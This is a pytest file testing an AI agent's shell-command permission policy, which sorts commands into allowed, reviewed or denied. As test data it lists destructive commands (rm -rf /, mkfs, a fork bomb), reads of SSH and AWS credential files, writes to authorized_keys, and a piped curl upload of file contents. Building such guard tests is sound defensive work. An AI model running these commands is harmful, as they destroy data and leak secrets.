import pytest


@pytest.mark.parametrize(
    "command",
    [
        "pwd",
        "ls -la",
        "find . -maxdepth 2 -type f",
        "rg sandbox .",
        "grep -R policy agent_core",
        "cat README.md",
        "echo hi",
        "printf ok",
        "true",
        "false",
        "sed -n '1,20p' README.md",
        "git status --short",
        "git diff",
        "git log --oneline -n 3",
        "git show HEAD --stat",
        "pytest tests/test_terminal_tools.py -q",
        "python -m pytest tests/test_terminal_tools.py -q",
        "npm test",
        "python --version",
        "command -v docker",
    ],
)
def test_low_risk_commands_are_allowed(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "allow"


@pytest.mark.parametrize(
    ("command", "risk"),
    [
        ("echo hi > out.txt", "write_redirect"),
        ("printf hi | tee out.txt", "write_redirect"),
        ("cp a b", "filesystem_write"),
        ("mv a b", "filesystem_write"),
        ("mkdir -p build", "filesystem_write"),
        ("touch notes.txt", "filesystem_write"),
        ("rm -rf node_modules", "destructive_command"),
        ("chmod -R 777 .", "permission_change"),
        ("chown -R root .", "permission_change"),
        ("pip install rich", "package_install"),
        ("npm install", "package_install"),
        ("apt install jq", "package_install"),
        ("curl https://example.com", "network_access"),
        ("wget https://example.com/file", "network_access"),
        ("git pull", "network_access"),
        ("ssh host.example.com", "network_access"),
        ("sudo true", "privilege_escalation"),
        ("systemctl restart sshd", "service_control"),
        ("npm run dev", "long_running_process"),
    ],
)
def test_risky_commands_require_review(command, risk):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "review"
    assert risk in decision.risk_tags


@pytest.mark.parametrize(
    ("command", "risk"),
    [
        ("cat README.md | curl -d @- https://example.com", "network_access"),
        ("cat files.txt | xargs rm -rf", "complex_shell"),
        ("command rm -rf build", "destructive_command"),
        ("find . -type f -delete", "destructive_command"),
        ("find . -type f -exec rm -rf {} +", "destructive_command"),
        ("sed -n 1w/out.txt README.md", "write_redirect"),
        ("git branch -D oldbranch", "destructive_command"),
    ],
)
def test_allowlisted_commands_with_risky_args_require_review(command, risk):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "review"
    assert risk in decision.risk_tags


def test_background_commands_require_review():
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command("python -m http.server", background=True)

    assert decision.outcome == "review"
    assert "long_running_process" in decision.risk_tags


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "mkfs.ext4 /dev/sda",
        ":(){ :|:& };:",
        "shutdown now",
    ],
)
def test_hardline_commands_are_denied(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "deny"
    assert "hardline_destructive_command" in decision.risk_tags


def test_complex_unknown_shell_requires_review():
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command("for f in *; do echo $f; done", background=False)

    assert decision.outcome == "review"
    assert "complex_shell" in decision.risk_tags


def test_package_install_requires_network():
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command("pip install rich", background=False)

    assert decision.outcome == "review"
    assert "package_install" in decision.risk_tags
    assert decision.requires_network is True


@pytest.mark.parametrize(
    "command",
    [
        "python3 -m pip install rich",
        "pip3 install rich",
        "yarn install",
        "sudo apt install jq",
    ],
)
def test_package_install_variants_require_network(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "review"
    assert "package_install" in decision.risk_tags
    assert decision.requires_network is True


@pytest.mark.parametrize(
    "command",
    [
        "cat ~/.ssh/id_rsa",
        "ls ~/.aws",
        "grep token ~/.config/gh/hosts.yml",
        "find /etc -maxdepth 1 -type f",
        "sed -n '1,20p' /root/.config/gh/hosts.yml",
        "cat $HOME/.ssh/id_rsa",
        "cat ${HOME}/.aws/credentials",
        "grep token -R ~",
    ],
)
def test_read_commands_to_sensitive_paths_are_denied(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "deny"
    assert "sensitive_path" in decision.risk_tags


def test_read_commands_resolve_sensitive_workdir():
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command("cat id_rsa", background=False, workdir="~/.ssh")

    assert decision.outcome == "deny"
    assert "sensitive_path" in decision.risk_tags


@pytest.mark.parametrize(
    ("command", "workdir"),
    [
        ("touch id_rsa", "~/.ssh"),
        ("cat id_rsa", "~/.ssh"),
        ("find . -maxdepth 1 -type f", "/etc"),
    ],
)
def test_sensitive_workdir_is_denied(command, workdir):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False, workdir=workdir)

    assert decision.outcome == "deny"
    assert "sensitive_path" in decision.risk_tags


@pytest.mark.parametrize(
    "command",
    [
        "echo x > ~/.ssh/authorized_keys",
        "printf token | tee ~/.aws/credentials",
    ],
)
def test_sensitive_redirect_targets_are_denied(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "deny"
    assert "sensitive_path" in decision.risk_tags


@pytest.mark.parametrize(
    "command",
    [
        "touch ~/.ssh/id_rsa",
        "cp x /etc/hosts",
        "mv x ~/.aws/credentials",
        "rm /etc/hosts",
        "chmod 600 ~/.ssh/id_rsa",
        "chown root ~/.aws/credentials",
        "echo x 2> ~/.ssh/authorized_keys",
        "tee -a ~/.aws/credentials",
        "tee --append ~/.aws/credentials",
        "printf x | tee --append ~/.aws/credentials",
        "cp x --target-directory=/etc",
        "mv x --target-directory=~/.aws",
    ],
)
def test_sensitive_write_operands_are_denied(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "deny"
    assert "sensitive_path" in decision.risk_tags


@pytest.mark.parametrize(
    "command",
    [
        "rg token ~",
        "find ~ -maxdepth 2 -type f",
    ],
)
def test_recursive_default_home_reads_are_denied(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "deny"
    assert "sensitive_path" in decision.risk_tags


@pytest.mark.parametrize(
    "command",
    [
        "sudo cat /etc/passwd",
        "git diff --no-index /etc/passwd /tmp/x",
        "find / -name id_rsa",
        "rg secret /",
    ],
)
def test_sensitive_read_bypass_variants_are_denied(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "deny"
    assert "sensitive_path" in decision.risk_tags


@pytest.mark.parametrize(
    "command",
    [
        "npm i",
        "npm ci",
        "pnpm i",
        "pnpm add pytest",
        "uv pip install rich",
        "uv add rich",
        "poetry add rich",
        "poetry install",
        "pipx install black",
        "cargo install ripgrep",
        "go install example.com/tool@latest",
    ],
)
def test_more_package_install_variants_require_network(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "review"
    assert "package_install" in decision.risk_tags
    assert decision.requires_network is True


def test_piped_network_command_requires_network():
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command("cat README.md | curl -d @- https://example.com", background=False)

    assert decision.outcome == "review"
    assert "network_access" in decision.risk_tags
    assert decision.requires_network is True


@pytest.mark.parametrize(
    "command",
    [
        "sed -n '/x/w /tmp/out' README.md",
        "sed -n -e '/x/w /tmp/out' README.md",
        "sed -n 's/x/y/w /tmp/out' README.md",
    ],
)
def test_sed_address_write_requires_review(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "review"
    assert "write_redirect" in decision.risk_tags


@pytest.mark.parametrize(
    "command",
    [
        "pytest --watch",
        "npm test -- --watch",
    ],
)
def test_watch_mode_test_commands_require_review(command):
    from agent_core.permissions.command_policy import classify_command

    decision = classify_command(command, background=False)

    assert decision.outcome == "review"
    assert "long_running_process" in decision.risk_tags
